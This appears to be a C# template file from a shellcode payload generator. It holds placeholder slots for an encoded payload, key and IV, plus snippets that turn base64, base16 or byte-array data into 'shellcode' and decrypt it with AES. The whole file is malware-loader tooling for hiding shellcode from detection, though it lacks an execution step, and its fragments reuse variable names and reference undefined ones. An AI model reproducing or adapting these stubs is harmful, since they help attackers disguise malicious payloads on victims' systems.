// CSharp encoded payload base64
string base64EncodedPayload = {{ base64EncodedPayload }};
string base64EncodedHash = "{{ base64EncodedHash }}";
string base64EncodedIV = "{{ base64EncodedIV }}";


// CSharp decode Base64 to byte array
using System.Text;
byte[] shellcode = Convert.FromBase64String(base64EncodedPayload);
byte[] hash = Convert.FromBase64String(base64EncodedHash);
byte[] iv = Convert.FromBase64String(base64EncodedIV);



// CSharp encoded payload base16
string base16EncodedPayload = {{ base16EncodedPayload }};
string base16EncodedHash = "{{ base16EncodedHash }}";
string base16EncodedIV = "{{ base16EncodedIV }}";



// CSharp decode base16 to byte array
using System.Globalization;
static byte[] base16ToByteArray(string base16String)
{
    byte[] shellcode = new byte[base16String.Length / 2];
    for (int index = 0; index < shellcode.Length; index++)
    {
        string byteValue = base16String.Substring(index * 2, 2);
        shellcode[index] = byte.Parse(byteValue, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
    }

    return shellcode;
}

byte[] shellcode = base16ToByteArray(base16EncodedPayload);
byte[] hash = base16ToByteArray(base16EncodedHash);
byte[] iv = base16ToByteArray(base16EncodedIV);




// CSharp byte array
byte[] byteArrayInt = { {{ byteArrayInt }} };
byte[] byteHashInt = { {{ byteHashInt }} };
byte[] byteIVInt = { {{ byteIVInt }} };


byte[] byteArrayHex = { {{ byteArrayHex }} };
byte[] byteHashHex = { {{ byteHashHex }} };
byte[] byteIVHex = { {{ byteIVHex }} };



// CSharp AES Function
using System.Security.Cryptography;
static byte[] aes(byte[] bs, byte[] hash, byte[] iv)
{
    AesManaged aes = new AesManaged();
    ICryptoTransform decryptor = aes.CreateDecryptor(hash, iv);
    MemoryStream ms = new MemoryStream(bs);
    CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read);
    byte[] decrypted = new byte[bs.Length];
    int decryptedByteCount = cs.Read(decrypted, 0, decrypted.Length);
    ms.Close();
    cs.Close();
    return decrypted;
}

byte[] shellcode = aes(encodedByteArray, byteHash, byteIV);
